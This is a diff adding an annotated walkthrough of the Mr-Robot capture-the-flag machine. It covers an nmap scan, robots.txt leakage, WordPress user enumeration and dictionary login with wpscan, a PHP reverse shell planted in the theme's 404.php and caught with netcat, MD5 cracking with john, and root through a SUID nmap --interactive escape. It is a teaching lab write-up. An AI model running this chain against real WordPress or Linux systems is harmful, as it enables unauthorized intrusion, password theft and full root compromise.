@@ -232,4 +232,252 @@ execution — so admin accounts need the same protection as server credentials.
 
 ---
 
+## The commands, annotated — every input and every output
+
+### 1. Scan
+
+```bash
+sudo nmap -sC -sV -p- -T4 -oA scans/mrrobot TARGET
+```
+
+```text
+Not shown: 65532 closed tcp ports (conn-refused)
+PORT    STATE  SERVICE VERSION
+22/tcp  closed ssh
+80/tcp  open   http    Apache httpd
+|_http-title: Mr-Robot Corp
+| http-robots.txt: 2 disallowed entries
+|_/fsocity.dic /key-1-of-3.txt
+443/tcp open   ssl/http Apache httpd
+|_http-title: Mr-Robot Corp
+| ssl-cert: Subject: commonName=www.example.com
+|_http-robots.txt: 2 disallowed entries
+|_/fsocity.dic /key-1-of-3.txt
+```
+
+Two things in that output decide the whole box. First, **`22/tcp closed ssh`** — SSH is
+actively refused, so there is no brute-force path and no key-based entry. Second, the NSE
+`http-robots.txt` script **read `robots.txt` for you and printed its two entries**:
+`/fsocity.dic` and `/key-1-of-3.txt`. `-sC` is not decoration; it front-ran the first manual
+step of the entire attack.
+
+### 2. `robots.txt` — the first file you always read
+
+```bash
+curl -s http://TARGET/robots.txt
+curl -s http://TARGET/key-1-of-3.txt
+wget http://TARGET/fsocity.dic
+wc -l fsocity.dic
+```
+
+```text
+User-agent: *
+fsocity.dic
+key-1-of-3.txt
+```
+```text
+073403c8a58a1f80d943455fb30724b9
+```
+```text
+858160 fsocity.dic
+```
+
+`robots.txt` is a **polite convention for search-engine crawlers, not a security control** —
+it is public by design, so listing a path there is publishing it. Here the site leaks **its
+own password dictionary**. `key-1-of-3.txt` is 32 hex characters: an MD5-shaped string, and
+flag 1.
+
+`wc -l` counts lines: **858,160**. De-duplicate before attacking:
+
+```bash
+sort -u fsocity.dic > fsocity-clean.dic
+wc -l fsocity-clean.dic
+```
+```text
+11451 fsocity-clean.dic
+```
+
+858,160 → **11,451**: a 75× reduction with zero loss of coverage. `sort -u` sorts and drops
+duplicates. Attacking with the raw list would take 75× longer for exactly the same result —
+and would look 75× worse in the server's logs.
+
+### 3. Username enumeration
+
+```bash
+wpscan --url http://TARGET/ -e u
+```
+
+```text
+[i] User(s) Identified:
+
+[+] elliot
+ | Found By: Rss Generator (Passive Detection)
+ | Confirmed By:
+ |  Wp Json Api (Aggressive Detection)
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+```
+
+Three independent detections agreeing is why you can trust the name. **The oracle behind
+`Author Id Brute Forcing`** is WordPress's handling of `/?author=1`: it redirects to the
+author's archive page, so requesting it with an invalid ID behaves differently from a valid
+one. Separately, `wp-login.php` returns *"Invalid username"* versus *"The password you
+entered for the username is incorrect"* — a second oracle. Either alone halves the search
+space; together they turn a two-unknown problem into a one-unknown one.
+
+### 4. The dictionary attack with the site's own list
+
+```bash
+wpscan --url http://TARGET/ -U elliot -P fsocity-clean.dic
+```
+
+```text
+[+] Performing password attack on Wp Login against 1 user/s
+[SUCCESS] - elliot / ER28-0652
+```
+
+`-U` usernames, `-P` password list. `Performing password attack on Wp Login` means it used
+the login form; with `xmlrpc.php` available it would say `on Xmlrpc`, which batches many
+guesses per request and is far faster — and is a finding in itself. `ER28-0652` is a themed
+password (a fictional employee ID), which is exactly why a **targeted** list won where
+`rockyou` would not.
+
+### 5. Theme Editor → code execution
+
+Log in at `http://TARGET/wp-login.php`, then **Appearance → Editor**, select the theme file
+**`404.php`**, replace its contents with a PHP reverse shell and save.
+
+```bash
+nc -lvnp 4444                                    # ATTACKER, first
+curl -s -o /dev/null -w '%{http_code}\n' http://TARGET/this-page-does-not-exist
+```
+
+```text
+200
+```
+
+WordPress administrators may edit theme PHP from the browser — **this is a feature, not a
+bug**, and it means "WordPress admin" is equivalent to "code execution on the web server".
+Requesting a URL that does not exist forces the `404.php` template to render, which runs your
+PHP. `-o /dev/null -w '%{http_code}\n'` discards the body and prints only the status code —
+note the theme's own 404 page returns **`200`**, because WordPress renders its "not found"
+template successfully. Do not read that 200 as "the page exists".
+
+```text
+Ncat: Connection from 192.168.56.101.
+daemon@linux:~$ id
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+```
+
+**`uid=1(daemon)`** — not `www-data`. This build runs Apache as the `daemon` account. Either
+way you are unprivileged, and the UID number matters only for interpreting file permissions
+later.
+
+### 6. TTY upgrade — mandatory here
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+# Ctrl+Z ; then locally:
+stty raw -echo; fg
+```
+
+You need this **before** `su`. In a raw shell `su` fails with `su: must be run from a
+terminal`, because there is no TTY for it to read the password from — and the error message
+does not explain that.
+
+### 7. The hash, and cracking it
+
+```bash
+ls -la /home/robot
+cat /home/robot/password.raw-md5
+```
+
+```text
+-r-------- 1 robot robot 33 Nov 13  2015 key-2-of-3.txt
+-rw-r--r-- 1 robot robot 39 Nov 13  2015 password.raw-md5
+```
+```text
+robot:c3fcd3d76192e4007dfb496cca67e13b
+```
+
+Read the `ls -l` output as two facts. `key-2-of-3.txt` is **`-r--------`** — owner-read only,
+so `daemon` cannot read it and you must *become* `robot`. `password.raw-md5` is
+**`-rw-r--r--`** — world-readable, so you can. And its filename tells you the algorithm:
+**raw MD5**, 32 hex characters, **unsalted**.
+
+```bash
+echo 'robot:c3fcd3d76192e4007dfb496cca67e13b' > robot.hash
+john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt robot.hash
+john --show robot.hash
+```
+
+```text
+Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+abcdefghijklmnopqrstuvwxyz (robot)
+1g 0:00:00:00 DONE 3842p/s
+Session completed.
+```
+
+`--format=Raw-MD5` removes the ambiguity of a bare 32-hex string (which could also be NTLM or
+MD4). **`Loaded 1 password hash`** is the line that confirms John understood the input —
+`No password hashes loaded` means a wrong format or a shell that ate a `$`. The result line is
+`password (account)`, where `robot` came from the `user:hash` form in your input file.
+`1g 0:00:00:00` — one guess, sub-second. **Unsalted MD5 offers no meaningful protection**;
+hashcat reports tens of *billions* per second for `-m 0` on a modern GPU.
+
+`abcdefghijklmnopqrstuvwxyz` is not in `rockyou` as a password — it is in there because
+*someone* chose it, and rockyou records what real people actually chose.
+
+### 8. Pivot, then SUID
+
+```bash
+su robot
+cat /home/robot/key-2-of-3.txt
+find / -perm -4000 -type f 2>/dev/null
+```
+
+```text
+822c73956184f694993bedee6f27867f
+```
+```text
+/usr/local/bin/nmap
+```
+
+`su robot` with the cracked password succeeds — and now `key-2-of-3.txt` is readable, because
+you *are* its owner. The SUID search returns **one** entry, and it is not a stock binary:
+`/usr/local/bin/nmap`. Note the path — `/usr/local/bin`, i.e. a **manually installed** nmap,
+not the distribution's, which is why it is old.
+
+```bash
+nmap --version
+nmap --interactive
+```
+
+```text
+Nmap version 3.81 ( http://www.insecure.org/nmap/ )
+```
+```text
+Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
+nmap> !sh
+# id
+uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
+```
+
+**nmap 3.81 still supports `--interactive`**, a mini-shell whose `!CMD` runs `CMD` through the
+OS shell. Because the binary is SUID root, that shell inherits **`euid=0`** — effective root —
+even though your real UID is still `1002(robot)`. Later nmap versions removed interactive mode
+precisely because it was so frequently abused when installed setuid.
+
+```bash
+cat /root/key-3-of-3.txt
+```
+
+The lesson to carry away: **an old version of a trusted tool is an attack surface.** The
+administrator installed nmap for convenience, set the SUID bit so any user could scan, and
+never noticed that the version they chose had an interactive escape. `nmap` is not on
+GTFOBins by accident.
+
+---
+
 _Back to [Learning Path 1](../README.md) · previous: [Machine 6 — bossplayersCTF: 1](06-bossplayersctf-1.md) · next: [Machine 8 — Empire: Breakout](08-empire-breakout.md) · full writeup: [`labs/3-053-mr-robot-1`](../../labs/3-053-mr-robot-1/README.md)._
